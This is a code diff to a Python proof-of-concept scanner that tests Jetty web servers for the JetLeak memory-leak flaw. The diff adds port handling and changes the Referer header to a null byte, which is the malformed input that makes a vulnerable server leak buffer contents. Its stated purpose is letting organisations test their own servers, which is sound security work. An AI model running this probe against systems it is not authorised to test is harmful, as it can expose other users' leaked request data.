@@ -51,8 +51,8 @@ class Poc(ABPoc):
         '''
         Github Author: Gotham Digital Science
         Purpose: This tool is intended to provide a quick-and-dirty way for organizations to test whether
-                 their Jetty web server versions are vulnerable to JetLeak. Currently, this script does
-                 not handle sites with invalid SSL certs. This will be fixed in a future iteration.
+                their Jetty web server versions are vulnerable to JetLeak. Currently, this script does
+                not handle sites with invalid SSL certs. This will be fixed in a future iteration.
         '''
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
@@ -60,17 +60,18 @@ class Poc(ABPoc):
                 
             conn = None
             target_pare = urlparse.urlparse(self.target)
+            port = target_pare.port if target_pare.port else 80
             http_type = target_pare.scheme
             if http_type == "https":
-                conn = httplib.HTTPSConnection(self.target)
+                conn = httplib.HTTPSConnection(self.target, port)
             elif http_type == "http":
-                conn = httplib.HTTPConnection(self.target)
+                conn = httplib.HTTPConnection(self.target, port)
             else:
                 #args['poc_ret']['Error'] = "Error: Only 'http' or 'https' URL Schemes Supported"
                 return None
 
             x = '\x00'
-            header = {'Referer': 'x'}
+            header = {'Referer': x}
             conn.request('POST', '/', '', header)
             r1 = conn.getresponse()
 
